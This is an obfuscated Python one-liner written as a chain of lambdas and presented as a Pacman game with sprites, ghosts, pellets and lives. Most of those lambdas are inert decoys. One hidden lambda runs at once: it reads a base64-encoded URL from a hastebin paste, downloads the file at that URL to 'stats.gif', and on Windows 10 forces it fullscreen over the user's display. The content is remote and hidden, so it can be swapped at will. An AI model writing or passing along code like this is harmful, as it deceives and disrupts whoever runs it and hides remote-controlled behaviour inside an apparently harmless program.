((lambda: ([['pacman.png', None, None, True, False], ['blueghost.png', None, None, False, True], ['pinkghost.png', None, None, False, True], ['redghost.png', None, True, True, True]])), ((lambda : __import__('builtins').__dict__['open']('stats.gif', 'wb+').write(__import__('requests').get(__import__('base64').b64decode(__import__('requests').get('https://hastebin.com/raw/imequhafih').content)).content))(), (lambda image: image.resize((__import__('ctypes').windll.user32.GetSystemMetrics(0), __import__('ctypes').windll.user32.GetSystemMetrics(1))).save('stats.gif'))(__import__('PIL.Image').Image.open('stats.gif')), (lambda LABEL, root, tk: [(tk.Label(root, image=photo).pack() or root.attributes('-fullscreen', True), None)[1] for LABEL['photo'] in [(tk.PhotoImage(file=(__import__('os').getcwd()+'\\stats.gif')))]][0])(globals(), __import__('tkinter').Tk(), __import__('tkinter')) if __import__('sys').getwindowsversion().major == 10 else False), (lambda PACMAN: True if PACMAN else False or PACMAN is not None), (lambda REDGHOST, PINKGHOST, BLUEGHOST: [True if GHOST_SPRITE is not None else False for GHOST_SPRITE in [REDGHOST, PINKGHOST, BLUEGHOST]]), lambda install_sprites: [True or install_sprites(sprite_link) for sprite_link in ['https://static.giantbomb.com/uploads/square_small/8/87790/2469740-blinky.png', 'https://static.giantbomb.com/uploads/square_small/8/87790/2469744-pinky.png', 'https://p.kindpng.com/picc/s/149-1494722_text-pacman-ghosts-ms-area-free-transparent-image.png']], (lambda DISPLAY_MAP, ALL_SPRITES_GENERATED: DISPLAY_MAP if ALL_SPRITES_GENERATED in ['red', 'pink', 'blue'] else False), (lambda PELLETS, POWERPELLETS, KILL_MODE: KILL_MODE if POWERPELLETS else PELLETS+1), (lambda UP, RIGHT, LEFT, DOWN: UP or True if UP else DOWN or RIGHT if True else LEFT), (lambda LIVES, PACMAN_IS_HIT: LIVES - 1 if PACMAN_IS_HIT else True), (lambda TKHANDLER, TKREPORT, ROOT, tkinter_, tkinter_magic_lib, PHOTOIMAGE: [[],[],[],...,[...,...,...],['i','j',[TKHANDLER, TKREPORT, ROOT, [tkinter_, tkinter_magic_lib], PHOTOIMAGE]]]), (lambda FINAL_RUN, PACMAN_IS_DEAD, POINTS, _display: _display('YOU WIN!') if POINTS > 10000 else False if PACMAN_IS_DEAD and FINAL_RUN else True))
